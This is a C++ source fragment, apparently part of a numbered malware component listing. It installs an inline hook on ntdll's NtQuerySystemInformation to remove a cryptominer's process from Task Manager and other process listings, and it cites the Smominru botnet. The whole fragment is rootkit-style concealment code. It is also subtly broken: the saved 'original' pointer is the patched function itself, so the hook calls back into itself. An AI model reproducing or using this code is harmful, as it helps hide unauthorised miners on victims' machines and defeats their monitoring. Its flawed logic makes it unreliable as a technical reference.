// -------------------------------------------------------
// B.11 NtQuerySystemInformation HOOK SETUP
//      Hide miner process from task manager by patching
//      the system call result filter in user-mode
//      (Kernel rootkit variant documented in Smominru)
// -------------------------------------------------------
typedef NTSTATUS(WINAPI* pNtQSI)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

pNtQSI g_orig_NtQSI = nullptr;
DWORD  g_hidden_pid  = 0;

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID   SystemInformation,
    ULONG   SystemInformationLength,
    PULONG  ReturnLength
) {
    NTSTATUS status = g_orig_NtQSI(
        SystemInformationClass, SystemInformation,
        SystemInformationLength, ReturnLength);

    if (SystemInformationClass != SystemProcessInformation) return status;
    if (!NT_SUCCESS(status)) return status;

    // Walk the linked list of SYSTEM_PROCESS_INFORMATION entries
    // and unlink our miner process
    auto* entry = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
    PSYSTEM_PROCESS_INFORMATION prev = nullptr;

    while (true) {
        DWORD pid = HandleToUlong(entry->UniqueProcessId);
        if (pid == g_hidden_pid && prev != nullptr) {
            // Unlink: set prev->NextEntryOffset to skip this entry
            if (entry->NextEntryOffset == 0)
                prev->NextEntryOffset = 0;
            else
                prev->NextEntryOffset += entry->NextEntryOffset;
        } else {
            prev = entry;
        }
        if (entry->NextEntryOffset == 0) break;
        entry = (PSYSTEM_PROCESS_INFORMATION)(
            (PBYTE)entry + entry->NextEntryOffset);
    }
    return status;
}

bool InstallNtQSIHook(DWORD pid_to_hide) {
    g_hidden_pid = pid_to_hide;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;

    FARPROC nqsi = GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!nqsi) return false;

    g_orig_NtQSI = (pNtQSI)nqsi;

    // Inline hook: overwrite first 12 bytes with absolute JMP
    // JMP [rip+0] / address (x64 trampoline)
    #ifdef _WIN64
    BYTE trampoline[] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP QWORD PTR [RIP+0]
        0x00, 0x00, 0x00, 0x00,              // low 32 bits of address
        0x00, 0x00, 0x00, 0x00              // high 32 bits of address
    };
    DWORD64 target_addr = (DWORD64)&HookedNtQuerySystemInformation;
    memcpy(trampoline + 6, &target_addr, 8);
    #else
    BYTE trampoline[] = {
        0xE9,                               // JMP rel32
        0x00, 0x00, 0x00, 0x00             // relative offset
    };
    DWORD rel = (DWORD)((DWORD_PTR)&HookedNtQuerySystemInformation
                       - (DWORD_PTR)nqsi - 5);
    memcpy(trampoline + 1, &rel, 4);
    #endif

    DWORD old;
    VirtualProtect(nqsi, sizeof(trampoline), PAGE_EXECUTE_READWRITE, &old);
    memcpy(nqsi, trampoline, sizeof(trampoline));
    VirtualProtect(nqsi, sizeof(trampoline), old, &old);

    return true;
}

